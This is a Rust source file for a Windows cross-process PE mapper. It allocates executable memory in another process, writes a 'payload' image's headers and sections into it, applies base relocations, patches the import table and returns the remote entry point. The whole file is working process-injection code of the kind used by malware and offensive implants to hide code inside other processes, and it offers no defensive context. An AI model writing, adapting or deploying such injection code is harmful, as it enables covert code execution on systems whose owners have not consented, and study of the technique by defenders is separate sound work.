//! Cross-process PE mapper for in-memory image injection.
//!
//! Maps a PE image into a remote process:
//! 1. Allocates memory at preferred or fallback base
//! 2. Writes headers and sections
//! 3. Applies base relocations
//! 4. Resolves and patches the IAT
//! 5. Sets per-section memory protections
#![cfg(windows)]
#![allow(unsafe_code)]

use std::ffi::CString;

use goblin::pe::section_table::{IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE};
use goblin::pe::PE;

use windows_sys::Win32::{
    Foundation::HANDLE,
    System::{
        Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
        LibraryLoader::{GetProcAddress, LoadLibraryA},
        Memory::{
            MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
            PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE, VIRTUAL_FREE_TYPE,
            VirtualAllocEx, VirtualFreeEx, VirtualProtectEx,
        },
    },
};

use super::InjectionError;

// Base relocation block header: rva (u32) + block_size (u32).
const RELOC_BLOCK_HDR: usize = 8;
// Type 10 == IMAGE_REL_BASED_DIR64 (64-bit absolute fixup).
const IMAGE_REL_BASED_DIR64: u16 = 10;

/// Map payload PE into remote process. Returns remote base address.
pub fn map_pe_into(process: HANDLE, payload: &[u8]) -> Result<*mut u8, InjectionError> {
    let pe = PE::parse(payload).map_err(|e| InjectionError::AllocFailed(e.to_string()))?;

    let opt = pe
        .header
        .optional_header
        .ok_or_else(|| InjectionError::AllocFailed("no optional header".into()))?;

    let image_size = opt.windows_fields.size_of_image as usize;
    let image_base = opt.windows_fields.image_base as usize;
    let size_of_headers = opt.windows_fields.size_of_headers as usize;

    // Step 1: allocate in remote process.
    let remote_base = unsafe {
        let preferred = VirtualAllocEx(
            process,
            image_base as *const _,
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if !preferred.is_null() {
            preferred as *mut u8
        } else {
            let fallback = VirtualAllocEx(
                process,
                std::ptr::null(),
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            if fallback.is_null() {
                return Err(InjectionError::AllocFailed("VirtualAllocEx failed".into()));
            }
            fallback as *mut u8
        }
    };

    // Helper: clean up allocation and return error.
    macro_rules! bail {
        ($e:expr) => {{
            unsafe {
                VirtualFreeEx(process, remote_base as *mut _, 0, MEM_RELEASE as VIRTUAL_FREE_TYPE);
            }
            return Err($e);
        }};
    }

    // Step 2: write PE headers.
    let headers_src = match payload.get(..size_of_headers) {
        Some(s) => s,
        None => bail!(InjectionError::WriteFailed("headers out of bounds".into())),
    };
    if !wpm(process, remote_base, headers_src) {
        bail!(InjectionError::WriteFailed("WriteProcessMemory headers".into()));
    }

    // Step 3: write sections.
    for sec in &pe.sections {
        let raw_size = sec.size_of_raw_data as usize;
        if raw_size == 0 {
            continue;
        }
        let raw_off = sec.pointer_to_raw_data as usize;
        let va = sec.virtual_address as usize;

        let src = match payload.get(raw_off..raw_off + raw_size) {
            Some(s) => s,
            None => bail!(InjectionError::WriteFailed(format!(
                "section data out of bounds: roff={raw_off} size={raw_size}"
            ))),
        };
        let dst = unsafe { remote_base.add(va) };
        if !wpm(process, dst, src) {
            bail!(InjectionError::WriteFailed(format!(
                "WriteProcessMemory section va={va:#x}"
            )));
        }
    }

    // Step 4: base relocations.
    let delta = (remote_base as isize).wrapping_sub(image_base as isize);
    if delta != 0 {
        if let Some(reloc_dd) = opt.data_directories.get_base_relocation_table() {
            let reloc_rva = reloc_dd.virtual_address as usize;
            let reloc_size = reloc_dd.size as usize;

            // Find file offset of .reloc data.
            let reloc_file_off = rva_to_file_offset(&pe.sections, reloc_rva);
            if let Some(off) = reloc_file_off {
                let reloc_data = match payload.get(off..off + reloc_size) {
                    Some(d) => d,
                    None => bail!(InjectionError::WriteFailed("reloc data OOB".into())),
                };
                if let Err(e) =
                    apply_base_relocations(process, remote_base, reloc_data, delta)
                {
                    bail!(e);
                }
            }
        }
    }

    // Step 5: resolve IAT.
    for imp in &pe.imports {
        let fn_va = resolve_import(imp);
        match fn_va {
            Some(va) => {
                let dst = unsafe { remote_base.add(imp.offset) };
                let va_bytes = va.to_le_bytes();
                if !wpm(process, dst, &va_bytes) {
                    bail!(InjectionError::WriteFailed(format!(
                        "WriteProcessMemory IAT {}!{}",
                        imp.dll, imp.name
                    )));
                }
            }
            None => {
                // Unresolved import — not fatal during map; caller may handle.
            }
        }
    }

    // Step 6: per-section memory protections.
    for sec in &pe.sections {
        let ch = sec.characteristics;
        let exec = ch & IMAGE_SCN_MEM_EXECUTE != 0;
        let write = ch & IMAGE_SCN_MEM_WRITE != 0;

        let prot: PAGE_PROTECTION_FLAGS = if exec && write {
            PAGE_EXECUTE_READWRITE
        } else if exec {
            PAGE_EXECUTE_READ
        } else if write {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };

        let va = sec.virtual_address as usize;
        let vsize = if sec.virtual_size > 0 {
            sec.virtual_size as usize
        } else {
            sec.size_of_raw_data as usize
        };
        if vsize == 0 {
            continue;
        }
        let addr = unsafe { remote_base.add(va) };
        let mut old_prot: PAGE_PROTECTION_FLAGS = 0;
        unsafe {
            VirtualProtectEx(process, addr as *const _, vsize, prot, &mut old_prot);
        }
    }

    Ok(remote_base)
}

/// Return OEP virtual address in remote process.
pub fn remote_oep(payload: &[u8], remote_base: *mut u8) -> Result<*mut u8, InjectionError> {
    let pe = PE::parse(payload).map_err(|e| InjectionError::AllocFailed(e.to_string()))?;

    let opt = pe
        .header
        .optional_header
        .ok_or_else(|| InjectionError::AllocFailed("no optional header".into()))?;

    let ep_rva = opt.standard_fields.address_of_entry_point as usize;
    Ok(unsafe { remote_base.add(ep_rva) })
}

// --- internal helpers -------------------------------------------------------

/// Write bytes to remote process memory. Returns true on success.
fn wpm(process: HANDLE, dst: *mut u8, src: &[u8]) -> bool {
    let mut written: usize = 0;
    let ok = unsafe {
        WriteProcessMemory(
            process,
            dst as *const _,
            src.as_ptr() as *const _,
            src.len(),
            &mut written,
        )
    };
    ok != 0 && written == src.len()
}

/// Convert RVA to file offset using section table.
fn rva_to_file_offset(
    sections: &[goblin::pe::section_table::SectionTable],
    rva: usize,
) -> Option<usize> {
    for sec in sections {
        let sec_va = sec.virtual_address as usize;
        let sec_vsize = if sec.virtual_size > 0 {
            sec.virtual_size as usize
        } else {
            sec.size_of_raw_data as usize
        };
        if rva >= sec_va && rva < sec_va + sec_vsize {
            let off = rva - sec_va;
            return Some(sec.pointer_to_raw_data as usize + off);
        }
    }
    None
}

/// Apply PE base relocations from raw .reloc section data.
fn apply_base_relocations(
    process: HANDLE,
    remote_base: *mut u8,
    data: &[u8],
    delta: isize,
) -> Result<(), InjectionError> {
    let mut pos = 0usize;

    while pos + RELOC_BLOCK_HDR <= data.len() {
        let block_rva = u32::from_le_bytes(data[pos..pos + 4].try_into().unwrap()) as usize;
        let block_size =
            u32::from_le_bytes(data[pos + 4..pos + 8].try_into().unwrap()) as usize;

        if block_size < RELOC_BLOCK_HDR {
            break;
        }

        let entries_end = pos + block_size;
        let mut entry_pos = pos + RELOC_BLOCK_HDR;

        while entry_pos + 2 <= entries_end && entry_pos + 2 <= data.len() {
            let word = u16::from_le_bytes(data[entry_pos..entry_pos + 2].try_into().unwrap());
            entry_pos += 2;

            let reloc_type = word >> 12;
            let offset_within_block = (word & 0x0FFF) as usize;

            if reloc_type != IMAGE_REL_BASED_DIR64 {
                continue;
            }

            let patch_rva = block_rva + offset_within_block;
            let patch_addr = unsafe { remote_base.add(patch_rva) };

            // Read current 8-byte value from remote process.
            let mut buf = [0u8; 8];
            let mut bytes_read: usize = 0;
            let ok = unsafe {
                ReadProcessMemory(
                    process,
                    patch_addr as *const _,
                    buf.as_mut_ptr() as *mut _,
                    8,
                    &mut bytes_read,
                )
            };
            if ok == 0 || bytes_read != 8 {
                return Err(InjectionError::WriteFailed(format!(
                    "ReadProcessMemory reloc rva={patch_rva:#x}"
                )));
            }

            let val = i64::from_le_bytes(buf);
            let patched = val.wrapping_add(delta as i64);
            let patched_bytes = patched.to_le_bytes();

            let mut written: usize = 0;
            let ok = unsafe {
                WriteProcessMemory(
                    process,
                    patch_addr as *const _,
                    patched_bytes.as_ptr() as *const _,
                    8,
                    &mut written,
                )
            };
            if ok == 0 || written != 8 {
                return Err(InjectionError::WriteFailed(format!(
                    "WriteProcessMemory reloc rva={patch_rva:#x}"
                )));
            }
        }

        pos += block_size;
    }

    Ok(())
}

/// Resolve a single import to its virtual address in the current process.
/// Returns None if the import cannot be resolved (library or symbol missing).
fn resolve_import(imp: &goblin::pe::import::Import<'_>) -> Option<u64> {
    let dll_cstr = CString::new(imp.dll).ok()?;
    let hmod = unsafe { LoadLibraryA(dll_cstr.as_ptr() as *const u8) };
    if hmod.is_null() {
        return None;
    }

    let proc_va = if imp.name.starts_with("ORDINAL ") {
        // Ordinal import: use raw ordinal value encoded in low 16 bits.
        let ordinal_ptr = imp.ordinal as usize as *const u8;
        unsafe { GetProcAddress(hmod, ordinal_ptr) }
    } else {
        let name_cstr = CString::new(imp.name.as_ref()).ok()?;
        unsafe { GetProcAddress(hmod, name_cstr.as_ptr() as *const u8) }
    };

    proc_va.map(|f| f as usize as u64)
}
